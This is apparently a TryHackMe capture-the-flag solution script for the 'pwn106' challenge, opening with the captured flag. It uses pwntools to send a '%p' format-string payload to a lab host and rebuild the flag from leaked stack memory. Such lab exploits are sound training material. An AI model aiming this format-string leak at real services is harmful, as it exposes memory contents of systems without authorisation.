#THM{y0U_w0n_th3_Giv3AwaY_anD_th1s_1s_YouR_fl4G}
from pwn import *

host  = '10.10.176.67' 
port = 9006
exe = 'pwn106-user-1644300441063.pwn106-user'
elf = ELF(exe)
context.binary = elf
p = remote(host, port)

# p = process(exe)
payload = b"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"
p.recvuntil(b"Enter your THM username to participate in the giveaway: ")
p.sendline(payload)
p.recvuntil(b"0x")
p.recvuntil(b"0x")
p.recvuntil(b"0x")
p.recvuntil(b"0x")
flag = p.recvuntil(b"0x").strip(b' 0x').decode()[::-1] + p.recvuntil(b"0x").strip(b' 0x').decode()[::-1] + p.recvuntil(b"0x").strip(b' 0x').decode()[::-1] + p.recvuntil(b"0x").strip(b' 0x').decode()[::-1] + p.recvuntil(b"0x").strip(b' 0x').decode()[::-1]

print(flag)
p.interactive()